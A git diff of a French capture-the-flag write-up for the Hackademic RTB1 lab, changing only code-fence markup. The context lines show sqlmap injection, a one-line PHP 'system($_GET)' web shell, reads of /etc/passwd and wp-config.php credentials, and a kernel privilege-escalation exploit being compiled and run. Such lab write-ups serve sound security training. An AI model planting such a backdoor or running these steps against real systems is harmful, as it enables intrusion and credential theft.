@@ -12,7 +12,7 @@ L'objectif de ce CTF est de lire le contenu du fichier */root/key.txt*
 
 Le système n'a pas beaucoup de ports ouverts, ce qui réduit nos angles d'attaque :  
 
-```plain
+```
 Nmap scan report for 192.168.1.62
 Host is up (0.00022s latency).
 Not shown: 65533 filtered ports
@@ -32,7 +32,7 @@ Webploitation
 
 Si on accède au site on a une page d'accueil avec un lien vers */Hackademic\_RTB1/*. Les pages sont en PHP et prennent des paramètres. Je lance [Wapiti](http://wapiti.sourceforge.net/) (parce que *Wapiti* c'est bien ;-) ) sans plus tarder :  
 
-```plain
+```
 > ./bin/wapiti http://192.168.1.62/Hackademic_RTB1/
 Wapiti-2.3.0 (wapiti.sourceforge.net)
 
@@ -91,7 +91,7 @@ Un bon nombre d'erreurs 500 a été retourné. Une faille XSS a été trouvée m
 
 On enchaîne sur [SQLmap](http://sqlmap.org/) (je coupe l'output qui est trop long) :  
 
-```plain
+```
 python sqlmap.py -u "http://192.168.1.62/Hackademic_RTB1/?cat=1" --dbms=mysql -p cat
 
 sqlmap identified the following injection points with a total of 51 HTTP(s) requests:
@@ -149,7 +149,7 @@ Un *phpinfo()* révèle une configuration banale avec peu de protections (*safe\
 
 On ajoute une backdoor PHP toute simple :  
 
-```plain
+```
 if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
 ```
 
@@ -169,7 +169,7 @@ On est sur une *Fedora 12* 32bits avec un kernel 2.6.31 (*Linux HackademicRTB1 2
 
 Voici un extrait du /etc/passwd :  
 
-```plain
+```
 root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
 daemon:x:2:2:daemon:/sbin:/sbin/nologin
@@ -194,7 +194,7 @@ Il y a un serveur SMTP qui écoute derrière le firewall :
 
 On obtient aisément le mot de passe de la BDD :  
 
-```plain
+```
 sh-4.0$ cat wp-config.php
 <?php
 // ** MySQL settings ** //
@@ -208,7 +208,7 @@ MySQL tourne sous l'utilisateur mysql, l'utilisation d'un *INTO OUTFILE* ne semb
 
 Finalement je me suis rabattu sur un exploit pour le noyau ([Linux RDS Protocol Local Privilege Escalation](http://www.exploit-db.com/exploits/15285/) par *Dan Rosenberg*) :  
 
-```plain
+```
 bash-4.0$ gcc -o rds rds.c 
 bash-4.0$ ./rds
 [*] Linux kernel >= 2.6.30 RDS socket exploit
